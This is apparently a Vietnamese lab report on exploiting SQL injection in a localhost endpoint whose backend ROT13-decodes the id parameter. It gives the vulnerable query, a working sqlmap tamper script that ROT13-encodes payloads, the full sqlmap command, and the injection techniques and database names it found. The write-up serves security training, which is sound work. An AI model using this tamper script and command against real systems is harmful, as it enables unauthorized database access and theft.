# Task 3: Báo Cáo Khai Thác SQLMap Qua Tamper Script ROT13

## 1. Mục Tiêu
Mục tiêu của bài là khai thác SQL Injection trên endpoint có cơ chế decode ROT13 ở backend, bằng SQLMap kết hợp tamper script để tự động ROT13 payload trước khi gửi đi

## 2. Setup 

Query đang dùng trong lab:
```sql
SELECT id, name, description, price, stock
FROM products
WHERE id = '$decoded_id'
```


## 3. Tamper Script

```python
from lib.core.enums import PRIORITY
import codecs

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    return codecs.encode(payload, "rot_13") if payload else payload
```

## 4. Exploit

Chạy sqlmap:
```bash
sqlmap -u "http://localhost:8003/?id=1" \
  --tamper="tamper/rot13_tamper.py" \
  -p "id" \
  --level=3 --risk=2 \
  --random-agent \
  --dbs \
  --batch
```

## 5. Kết Quả
1. Boolean-based blind
2. Error-based (MySQL >= 5.6, GTID_SUBSET)
3. Time-based blind (SLEEP)
4. UNION query (5 columns)
Database lấy được:

information_schema
mysql
performance_schema
rot13_db
sys

